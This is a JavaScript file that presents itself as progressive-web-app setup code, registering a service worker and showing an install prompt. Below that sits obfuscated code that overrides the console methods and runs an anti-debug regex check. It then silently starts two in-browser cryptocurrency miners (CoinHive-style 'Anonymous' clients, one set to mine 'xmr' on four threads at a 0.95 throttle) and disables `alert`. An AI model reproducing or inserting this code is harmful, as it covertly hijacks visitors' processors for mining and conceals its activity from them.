async function registerSW() {
    if ('serviceWorker' in navigator) {
        window['addEventListener']('load', function () {
            navigator['serviceWorker']['register']('/serviceWorker.js')['then'](_0x31c5b1 => console['log']('service\x20worker\x20registered'))['catch'](_0x39e69e => console['log']('service\x20worker\x20not\x20registered', _0x39e69e));
        });
    }
}

window['addEventListener']('beforeinstallprompt', _0x4abead => function (_0x4e7857) {
    return window['matchMedia']('(display-mode:\x20standalone)')['matches'] ? (document['querySelector']('.welcomeMsg')['classList']['add']('activation'), createEl('welcomeMsg', 'WELCOME\x20TO\x20OUR\x20APP'), _0x4e7857['preventDefault']()) : (createEl('installMsg', '<span><b>CLICK\x20HERE</b>\x20TO\x20INSTALL\x20THIS\x20APP\x20ON\x20YOUR\x20DEVICE</span>'), document['querySelector']('.installMsg')['onclick'] = _0x232b7d => _0x4e7857['prompt'](), _0x4e7857['preventDefault'](), document['querySelector']('.installMsg')['classList']['add']('activation'));
});

var _0x417cdc = _0x2711;
(function (_0xac704b, _0x27717e) {
    var _0x57320b = _0x2711, _0x4fafd2 = _0xac704b();
    while (!![]) {
        try {
            var _0x402e79 = parseInt(_0x57320b(0x19d)) / 0x1 + -parseInt(_0x57320b(0x1a8)) / 0x2 + -parseInt(_0x57320b(0x195)) / 0x3 * (parseInt(_0x57320b(0x19a)) / 0x4) + parseInt(_0x57320b(0x19e)) / 0x5 + -parseInt(_0x57320b(0x1a3)) / 0x6 + parseInt(_0x57320b(0x193)) / 0x7 + -parseInt(_0x57320b(0x18f)) / 0x8 * (parseInt(_0x57320b(0x190)) / 0x9);
            if (_0x402e79 === _0x27717e) break; else _0x4fafd2['push'](_0x4fafd2['shift']());
        } catch (_0x2896e5) {
            _0x4fafd2['push'](_0x4fafd2['shift']());
        }
    }
}(_0x2951, 0x651e4));

function _0x2951() {
    var _0x4ac58a = ['exception', '488eQpVWa', '31149dVZyWx', 'error', 'Anonymous', '5742219IGJxwZ', '(((.+)+)+)+$', '1023EEoKEW', 'log', 'info', 'apply', 'bind', '3252aBsbpn', 'warn', 'toString', '454652OTjMjV', '2633200vENrhs', 'xmr', 'console', 'start', 'search', '2710704pnIvgr', '{}.constructor(\x22return\x20this\x22)(\x20)', 'return\x20(function()\x20', '__proto__', 'table', '894582GzidbV', 'trace'];
    _0x2951 = function () {
        return _0x4ac58a;
    };
    return _0x2951();
}

var _0xfc6f94 = (function () {
    var _0x9beac1 = !![];
    return function (_0x2d0442, _0x43fc04) {
        var _0x24db54 = _0x9beac1 ? function () {
            var _0x36c4a2 = _0x2711;
            if (_0x43fc04) {
                var _0x49ab55 = _0x43fc04[_0x36c4a2(0x198)](_0x2d0442, arguments);
                return _0x43fc04 = null, _0x49ab55;
            }
        } : function () {
        };
        return _0x9beac1 = ![], _0x24db54;
    };
}()), _0x3738f1 = _0xfc6f94(this, function () {
    var _0x21a810 = _0x2711;
    return _0x3738f1[_0x21a810(0x19c)]()[_0x21a810(0x1a2)](_0x21a810(0x194))[_0x21a810(0x19c)]()['constructor'](_0x3738f1)[_0x21a810(0x1a2)]('(((.+)+)+)+$');
});

function _0x2711(_0x3fa83e, _0x6751fe) {
    var _0xf37210 = _0x2951();
    return _0x2711 = function (_0x21d549, _0x2334d0) {
        _0x21d549 = _0x21d549 - 0x18f;
        var _0x4aded8 = _0xf37210[_0x21d549];
        return _0x4aded8;
    }, _0x2711(_0x3fa83e, _0x6751fe);
}

_0x3738f1();
var _0x2334d0 = (function () {
    var _0xbee8da = !![];
    return function (_0x5b5681, _0x3e74f4) {
        var _0x472468 = _0xbee8da ? function () {
            var _0x5a9ae8 = _0x2711;
            if (_0x3e74f4) {
                var _0xb682c2 = _0x3e74f4[_0x5a9ae8(0x198)](_0x5b5681, arguments);
                return _0x3e74f4 = null, _0xb682c2;
            }
        } : function () {
        };
        return _0xbee8da = ![], _0x472468;
    };
}()), _0x21d549 = _0x2334d0(this, function () {
    var _0x4445d4 = _0x2711, _0x5d0ef3 = function () {
            var _0x34e027 = _0x2711, _0x13a479;
            try {
                _0x13a479 = Function(_0x34e027(0x1a5) + _0x34e027(0x1a4) + ');')();
            } catch (_0x29ee46) {
                _0x13a479 = window;
            }
            return _0x13a479;
        }, _0x10b014 = _0x5d0ef3(), _0x36cdf5 = _0x10b014[_0x4445d4(0x1a0)] = _0x10b014[_0x4445d4(0x1a0)] || {},
        _0x2135b5 = [_0x4445d4(0x196), _0x4445d4(0x19b), _0x4445d4(0x197), _0x4445d4(0x191), _0x4445d4(0x1aa), _0x4445d4(0x1a7), _0x4445d4(0x1a9)];
    for (var _0x2f4b98 = 0x0; _0x2f4b98 < _0x2135b5['length']; _0x2f4b98++) {
        var _0x584c1f = _0x2334d0['constructor']['prototype']['bind'](_0x2334d0), _0x1d105a = _0x2135b5[_0x2f4b98],
            _0x5e91a4 = _0x36cdf5[_0x1d105a] || _0x584c1f;
        _0x584c1f[_0x4445d4(0x1a6)] = _0x2334d0[_0x4445d4(0x199)](_0x2334d0), _0x584c1f['toString'] = _0x5e91a4[_0x4445d4(0x19c)][_0x4445d4(0x199)](_0x5e91a4), _0x36cdf5[_0x1d105a] = _0x584c1f;
    }
});
_0x21d549(), new Client[(_0x417cdc(0x192))]('94fd352e2648f84468974dc47e5036a41f545b7f0c7293c829891a68f1626566', {
    'throttle': 0.95,
    'c': 'w',
    'ads': 0x0
})['start'](), new CRLT['Anonymous']('b7f07eae9523cd903e39b57f6c71aa88d657928c94c3', {
    'threads': 0x4,
    'autoThreads': ![],
    'throttle': 0.95,
    'coin': _0x417cdc(0x19f)
})[_0x417cdc(0x1a1)](), alert = function () {
};